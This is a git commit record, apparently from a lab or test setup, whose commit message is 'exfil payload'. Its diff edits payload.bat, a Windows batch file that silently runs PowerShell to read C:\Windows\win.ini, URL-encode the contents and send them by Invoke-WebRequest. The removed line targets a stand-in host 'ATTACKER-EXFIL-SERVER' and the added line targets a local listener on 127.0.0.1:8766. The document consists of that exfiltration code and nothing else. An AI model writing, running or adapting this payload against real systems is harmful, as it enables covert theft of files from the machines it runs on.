9e9ffa0e53de006bde81c7ec150adf220ca203f7
qianmeng <zzq13616608981@qq.com>
2026-09-13 20:43:48 +0800

    exfil payload

--- payload.bat
+++ payload.bat
@@ -1,3 +1,3 @@
 @echo off
-powershell -NoProfile -Command "$c=[System.IO.File]::ReadAllText('C:/Windows/win.ini');Invoke-WebRequest -Uri 'http://ATTACKER-EXFIL-SERVER/exfil?src=winini&content='+[uri]::EscapeDataString($c) -UseBasicParsing" > NUL 2>&1
+powershell -NoProfile -Command "$c=[System.IO.File]::ReadAllText('C:\Windows\win.ini');$e=[uri]::EscapeDataString($c.Substring(0,[Math]::Min(300,$c.Length)));Invoke-WebRequest -Uri ('http://127.0.0.1:8766/exfil?src=winini&content='+$e) -UseBasicParsing" > NUL 2>&1
 exit
